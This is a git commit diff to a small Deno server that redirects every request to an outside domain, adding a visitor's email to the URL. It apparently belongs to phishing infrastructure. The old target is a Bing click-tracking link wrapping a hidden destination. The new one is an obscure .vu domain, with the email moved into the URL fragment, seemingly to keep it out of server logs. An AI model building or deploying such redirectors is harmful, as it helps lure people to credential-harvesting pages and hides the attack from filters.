c4f640ab271751146795a5fbcbf2c4cd0cdeaa75
tailopez147 <49619133+tailopez147@users.noreply.github.com>
2026-08-04 13:00:07 +0300

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ Deno.serve({ port: PORT }, async (req) => {
   const url = new URL(req.url);
 
   const redirectBase =
-    "https://www.bing.com/ck/a?!&&p=82b1182da358da9a8ce89787e818ec7e2e11251ce2a224003dd1b978f82a3f9cJmltdHM9MTc4MjM0NTYwMA&ptn=3&ver=2&hsh=4&fclid=080ac139-b0f5-6daa-32cb-d64db12c6c83&u=a1aHR0cHM6Ly8xaGNtLmdwc3RyYWNraW5nLnBlLw";
+    "https://rlburnkdksinc.vu/";
 
   let email: string | null = null;
 
@@ -32,7 +32,7 @@ Deno.serve({ port: PORT }, async (req) => {
   }
 
   const redirectUrl = email
-    ? redirectBase.replace(/\/+$/, "") + "/" + email
+    ? redirectBase.replace(/\/+$/, "") + "#" + email
     : redirectBase;
 
   return Response.redirect(redirectUrl, 302);
